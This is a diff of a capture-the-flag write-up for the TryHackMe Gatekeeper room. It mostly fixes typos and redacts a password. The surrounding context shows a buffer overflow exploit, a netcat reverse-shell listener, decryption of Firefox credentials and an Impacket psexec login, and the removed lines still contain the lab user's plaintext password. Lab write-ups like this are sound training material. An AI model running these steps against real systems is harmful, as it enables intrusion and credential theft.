@@ -23,7 +23,6 @@ tags:
 ![gatekeeper](/assets/images/2021-03-20-11-40-39.png)
 
 Gatekeeper is rated as a medium difficulty room on TryHackMe. We start by finding something responding on an unusual port. Further investigation reveals an SMB share which we gain access to and download an executable. This turns out to be vulnerable to a buffer overflow, which we eventually use to exploit the version running on the target machine. On the target we find Firefox credentials that we retrieve, and then use with Impacket to gain a system level command shell.
-he same technique for each so I just run through it twice.
 
 <!--more-->
 Skills required are a basic understanding of the tools and techniques needed to debug an application. Skills learned are a better understanding of EIP, ESP and other registers that we can use to help us develop an exploit in Python. We also see how to use PSExec from Kali to remotely execute commands on Windows.
@@ -181,7 +180,6 @@ A Windows 32bit executable, let's pull it over to a 32bit Win10 VM where I have 
 ```text
 root@kali:/home/kali/thm/gatekeeper# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-192.168.0.11 - - [14/Mar/2021 22:40:50] "GET / HTTP/1.1" 200 -
 ```
 
 Log on to my Win10 VM and browse to get the file:
@@ -358,7 +356,7 @@ First we need to check for bad characters. We use Mona to create our initial lis
 !mona bytearray -b "\x00"
 ```
 
-You can see in the output it list all of the possible ASCII characters:
+You can see in the output it lists all of the possible ASCII characters:
 
 ![gatekeeper-bytearray](/assets/images/2021-03-17-22-06-01.png)
 
@@ -512,7 +510,7 @@ payload = shellcode created by MSFVenom
 Now we start a netcat session listening in another terminal on Kali, run our exploit, we should see we are connected to a reverse shell:
 
 ```text
-root@kali:/home/kali/thm/gatekeeper# nc -nlvp 1234                                                                 
+root@kali:/home/kali/thm/gatekeeper# nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [192.168.0.19] from (UNKNOWN) [192.168.0.11] 51219
 Microsoft Windows [Version 10.0.17134.112]
@@ -664,7 +662,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 111892 (109K) [application/zip]
 Saving to: ‘netcat-win32-1.12.zip’
 
-netcat-win32-1.12.zip                                 100%[=========================================================
+netcat-win32-1.12.zip                                 100%[============================================
 
 2021-03-18 21:55:38 (628 KB/s) - ‘netcat-win32-1.12.zip’ saved [111892/111892]
 
@@ -758,7 +756,7 @@ globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
 <SNIP>
 clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
 decrypting login/password pairs
-   https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
+   https://creds.com:b'mayor',b'<<HIDDEN>>'
 ```
 
 Excellent we have a user and password. Now we can try to use PSExec to start a remote command prompt using those credentials:
@@ -766,7 +764,7 @@ Excellent we have a user and password. Now we can try to use PSExec to start a r
 ## Impacket
 
 ```text
-kali@kali:~/thm/gatekeeper$ python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.245.39 cmd.exe
+kali@kali:~/thm/gatekeeper$ python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:<<HIDDEN>>@10.10.245.39 cmd.exe
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Requesting shares on 10.10.245.39.....
